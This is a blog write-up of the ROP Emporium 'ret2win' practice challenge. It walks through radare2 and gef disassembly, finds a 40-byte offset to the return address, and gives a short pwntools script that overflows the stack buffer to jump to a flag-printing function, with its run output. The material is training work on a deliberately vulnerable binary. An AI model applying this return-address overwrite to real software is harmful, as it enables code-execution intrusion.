---
layout: post
title: "ROP emporium ret2win"
tags: [ropemporium]
comments: false
---

We are given with a simpole binary for this challenge.

```
root@kali:~/ropemporium# radare2 ret2win
[0x00400650]> izz
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String

007 0x00000405 0x00400405   5   6 (.dynstr) ascii fgets
008 0x0000040b 0x0040040b   6   7 (.dynstr) ascii memset
009 0x00000412 0x00400412   6   7 (.dynstr) ascii stdout
010 0x00000419 0x00400419   6   7 (.dynstr) ascii stderr
011 0x00000420 0x00400420   6   7 (.dynstr) ascii system
012 0x00000427 0x00400427   7   8 (.dynstr) ascii setvbuf
013 0x0000042f 0x0040042f  17  18 (.dynstr) ascii __libc_start_main
014 0x00000441 0x00400441  14  15 (.dynstr) ascii __gmon_start__
015 0x00000450 0x00400450  11  12 (.dynstr) ascii GLIBC_2.2.5
016 0x000005c1 0x004005c1   4   5 (.plt) ascii 5B\n 
017 0x000005c7 0x004005c7   4   5 (.plt) ascii %D\n 
018 0x000005d1 0x004005d1   4   5 (.plt) ascii %B\n 
019 0x000005e1 0x004005e1   4   5 (.plt) ascii %:\n 
020 0x000005f1 0x004005f1   4   5 (.plt) ascii %2\n 
021 0x00000601 0x00400601   4   5 (.plt) ascii %*\n 
022 0x00000611 0x00400611   4   5 (.plt) ascii %"\n 
023 0x00000685 0x00400685   4   5 (.text) ascii UH-`
024 0x00000840 0x00400840   5   6 (.text) ascii AWAVA
025 0x00000847 0x00400847   5   6 (.text) ascii AUATL
026 0x00000899 0x00400899  14  16 (.text)  utf8 \b[]A\A]A^A_Ðf. blocks=Basic Latin,Latin-1 Supplement
027 0x000008c8 0x004008c8  23  24 (.rodata) ascii ret2win by ROP Emporium
028 0x000008e0 0x004008e0   7   8 (.rodata) ascii 64bits\n
029 0x000008e8 0x004008e8   8   9 (.rodata) ascii \nExiting
030 0x000008f8 0x004008f8 125 126 (.rodata) ascii For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?
031 0x00000978 0x00400978 100 101 (.rodata) ascii You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n
032 0x000009e0 0x004009e0  28  29 (.rodata) ascii Thank you! Here's your flag:
033 0x000009fd 0x004009fd  17  18 (.rodata) ascii /bin/cat flag.txt
034 0x00000a68 0x00400a68   4   5 (.eh_frame) ascii \e\f\a\b
035 0x00000a98 0x00400a98   4   5 (.eh_frame) ascii \e\f\a\b
036 0x00000abf 0x00400abf   5   6 (.eh_frame) ascii ;*3$"
037 0x00000ae2 0x00400ae2   4   5 (.eh_frame) ascii j\f\a\b
038 0x00000b02 0x00400b02   4   5 (.eh_frame) ascii W\f\a\b
039 0x00000b21 0x00400b21   4   5 (.eh_frame) ascii [\f\a\b
040 0x00001060 0x00000000  51  52 (.comment) ascii GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
041 0x000017d1 0x00000001  10  11 (.strtab) ascii crtstuff.c
042 0x000017dc 0x0000000c  12  13 (.strtab) ascii __JCR_LIST__
043 0x000017e9 0x00000019  20  21 (.strtab) ascii deregister_tm_clones
044 0x000017fe 0x0000002e  21  22 (.strtab) ascii __do_global_dtors_aux
045 0x00001814 0x00000044  14  15 (.strtab) ascii completed.7585
046 0x00001823 0x00000053  38  39 (.strtab) ascii __do_global_dtors_aux_fini_array_entry
047 0x0000184a 0x0000007a  11  12 (.strtab) ascii frame_dummy
048 0x00001856 0x00000086  30  31 (.strtab) ascii __frame_dummy_init_array_entry
049 0x00001875 0x000000a5   9  10 (.strtab) ascii ret2win.c
050 0x0000187f 0x000000af   5   6 (.strtab) ascii pwnme
051 0x00001885 0x000000b5   7   8 (.strtab) ascii ret2win
052 0x0000188d 0x000000bd  13  14 (.strtab) ascii __FRAME_END__
053 0x0000189b 0x000000cb  11  12 (.strtab) ascii __JCR_END__
054 0x000018a7 0x000000d7  16  17 (.strtab) ascii __init_array_end
055 0x000018b8 0x000000e8   8   9 (.strtab) ascii _DYNAMIC
056 0x000018c1 0x000000f1  18  19 (.strtab) ascii __init_array_start
057 0x000018d4 0x00000104  18  19 (.strtab) ascii __GNU_EH_FRAME_HDR
058 0x000018e7 0x00000117  21  22 (.strtab) ascii _GLOBAL_OFFSET_TABLE_
059 0x000018fd 0x0000012d  15  16 (.strtab) ascii __libc_csu_fini
060 0x0000190d 0x0000013d  27  28 (.strtab) ascii _ITM_deregisterTMCloneTable
061 0x00001929 0x00000159  19  20 (.strtab) ascii stdout@@GLIBC_2.2.5

```

By using radare2 -> izz we can know that the binary includes some functions that might be related to the challenge(pwnme, ret2win)

And by using fgets, we can guess that it might be an overflow challenge.

binary ran
```
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> ASDF

Exiting
```
So here, we should be about 90% sure that this challenge is an overflow challenge.

Let's rev this binary.

main disassembled.
```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400746 <+0>:     push   rbp
   0x0000000000400747 <+1>:     mov    rbp,rsp
   0x000000000040074a <+4>:     mov    rax,QWORD PTR [rip+0x20090f]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x0000000000400751 <+11>:    mov    ecx,0x0
   0x0000000000400756 <+16>:    mov    edx,0x2
   0x000000000040075b <+21>:    mov    esi,0x0
   0x0000000000400760 <+26>:    mov    rdi,rax
   0x0000000000400763 <+29>:    call   0x400630 <setvbuf@plt>
   0x0000000000400768 <+34>:    mov    rax,QWORD PTR [rip+0x200911]        # 0x601080 <stderr@@GLIBC_2.2.5>
   0x000000000040076f <+41>:    mov    ecx,0x0
   0x0000000000400774 <+46>:    mov    edx,0x2
   0x0000000000400779 <+51>:    mov    esi,0x0
   0x000000000040077e <+56>:    mov    rdi,rax
   0x0000000000400781 <+59>:    call   0x400630 <setvbuf@plt>
   0x0000000000400786 <+64>:    mov    edi,0x4008c8
   0x000000000040078b <+69>:    call   0x4005d0 <puts@plt>
   0x0000000000400790 <+74>:    mov    edi,0x4008e0
   0x0000000000400795 <+79>:    call   0x4005d0 <puts@plt>
   0x000000000040079a <+84>:    mov    eax,0x0
   0x000000000040079f <+89>:    call   0x4007b5 <pwnme>
   0x00000000004007a4 <+94>:    mov    edi,0x4008e8
   0x00000000004007a9 <+99>:    call   0x4005d0 <puts@plt>
   0x00000000004007ae <+104>:   mov    eax,0x0
   0x00000000004007b3 <+109>:   pop    rbp
   0x00000000004007b4 <+110>:   ret    
End of assembler dump.

```

nothing much here instead that it calls pwnme.

pwnme disassembled.
```
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004007b5 <+0>:     push   rbp
   0x00000000004007b6 <+1>:     mov    rbp,rsp
   0x00000000004007b9 <+4>:     sub    rsp,0x20
   0x00000000004007bd <+8>:     lea    rax,[rbp-0x20]
   0x00000000004007c1 <+12>:    mov    edx,0x20
   0x00000000004007c6 <+17>:    mov    esi,0x0
   0x00000000004007cb <+22>:    mov    rdi,rax
   0x00000000004007ce <+25>:    call   0x400600 <memset@plt>
   0x00000000004007d3 <+30>:    mov    edi,0x4008f8
   0x00000000004007d8 <+35>:    call   0x4005d0 <puts@plt>
   0x00000000004007dd <+40>:    mov    edi,0x400978
   0x00000000004007e2 <+45>:    call   0x4005d0 <puts@plt>
   0x00000000004007e7 <+50>:    mov    edi,0x4009dd
   0x00000000004007ec <+55>:    mov    eax,0x0
   0x00000000004007f1 <+60>:    call   0x4005f0 <printf@plt>
   0x00000000004007f6 <+65>:    mov    rdx,QWORD PTR [rip+0x200873]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004007fd <+72>:    lea    rax,[rbp-0x20]
   0x0000000000400801 <+76>:    mov    esi,0x32
   0x0000000000400806 <+81>:    mov    rdi,rax
   0x0000000000400809 <+84>:    call   0x400620 <fgets@plt>
   0x000000000040080e <+89>:    nop
   0x000000000040080f <+90>:    leave  
   0x0000000000400810 <+91>:    ret    
End of assembler dump.
```

It uses the vulnerable function fgets() <-- fgets is actually not that dangerous except when the prgorammer makes a mistake and
puts a bigger value for the input size than the actual size of the variable unlike gets, gets() doesn't specify the size so you should never be using get()

So we need to get the offset for [rbp-0x20] which can be done by gef's pattern create, search

```
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
[+] Saved as '$_gef0'
gef➤  quit
root@kali:~/r
```
first create a pattern

```
gef➤  pattern search $rsp
[+] Searching '$rsp'
[+] Found at offset 40 (little-endian search) likely

```

So the offset is 40

and let's look at the function that we found by radare2 which was ret2win

```
gef➤  disas ret2win
Dump of assembler code for function ret2win:
   0x0000000000400811 <+0>:     push   rbp
   0x0000000000400812 <+1>:     mov    rbp,rsp
   0x0000000000400815 <+4>:     mov    edi,0x4009e0
   0x000000000040081a <+9>:     mov    eax,0x0
   0x000000000040081f <+14>:    call   0x4005f0 <printf@plt>
   0x0000000000400824 <+19>:    mov    edi,0x4009fd
   0x0000000000400829 <+24>:    call   0x4005e0 <system@plt>
   0x000000000040082e <+29>:    nop
   0x000000000040082f <+30>:    pop    rbp
   0x0000000000400830 <+31>:    ret    
End of assembler dump.
gef➤  x/s 0x4009fd
0x4009fd:       "/bin/cat flag.txt"
```

yup this program just gives out a function that prints flag.txt

so the exploit will be like

```
offset + 0x0000000000400811
```


exploit code
```
from pwn import *

p = process("./ret2win")

offset = b"A"*40
payload = offset
payload += p64(0x400811)

print(p.recvuntil(">"))
p.sendline(payload)
print(p.recvline())
```

run 
```
root@kali:~/ropemporium# python ret2win.py
[+] Starting program './ret2win': Done
[ERROR] Neither 'qemu-i386' nor 'qemu-i386-static' are available
b"ret2win by ROP Emporium\n64bits\n\nFor my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?\nYou there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n\n>"
b" Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}\n"
[*] Stopped program './ret2win'
```
